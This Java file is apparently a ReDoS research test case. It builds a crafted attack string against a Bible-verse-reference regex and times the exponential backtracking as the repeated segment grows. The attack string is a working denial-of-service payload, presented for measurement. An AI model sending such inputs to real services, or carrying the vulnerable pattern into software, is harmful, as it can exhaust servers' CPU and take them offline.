import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class regexlib_887 {
    /* 887
     * (?:(?:[123]|I{1,3})\s*)?(?:[A-Z][a-zA-Z]+|Song of Songs|Song of Solomon).?\s*(?:1?[0-9]?[0-9]):\s*\d{1,3}(?:[,-]\s*\d{1,3})*(?:;\s*(?:(?:[123]|I{1,3})\s*)?(?:[A-Z][a-zA-Z]+|Song of Songs|Song of Solomon)?.?\s*(?:1?[0-9]?[0-9]):\s*\d{1,3}(?:[,-]\s*\d{1,3})*)*
     * EXPONENT
     * nums:2
     * EXPONENT AttackString:"Aa0:1"+";\t0:0"*16+"!1 __EOA(i or ii)"
     */
    public static void main(String[] args) throws InterruptedException {
        String regex = "(?:(?:[123]|I{1,3})\\s*)?(?:[A-Z][a-zA-Z]+|Song of Songs|Song of Solomon).?\\s*(?:1?[0-9]?[0-9]):\\s*\\d{1,3}(?:[,-]\\s*\\d{1,3})*(?:;\\s*(?:(?:[123]|I{1,3})\\s*)?(?:[A-Z][a-zA-Z]+|Song of Songs|Song of Solomon)?.?\\s*(?:1?[0-9]?[0-9]):\\s*\\d{1,3}(?:[,-]\\s*\\d{1,3})*)*";
        for (int i = 0; i < 1000; i++) {
            StringBuilder attackString = new StringBuilder();
            // 前缀
            attackString.append("Aa0:1");
            // 歧义点
            for (int j = 0; j < i * 1; j++) {
                attackString.append(";\t0:0");
            }
            // 后缀
            attackString.append("!1 __EOA(i or ii)");
//            System.out.println(attackString);
            long time1 = System.nanoTime();
            boolean isMatch = Pattern.matches(regex, attackString);
//            boolean isMatch = Pattern.compile(regex).matcher(attackString).find();
            long time2 = System.nanoTime();
            System.out.println(i * 1 + " " + isMatch + " " + (time2 - time1)/1e9);
        }
    }
}
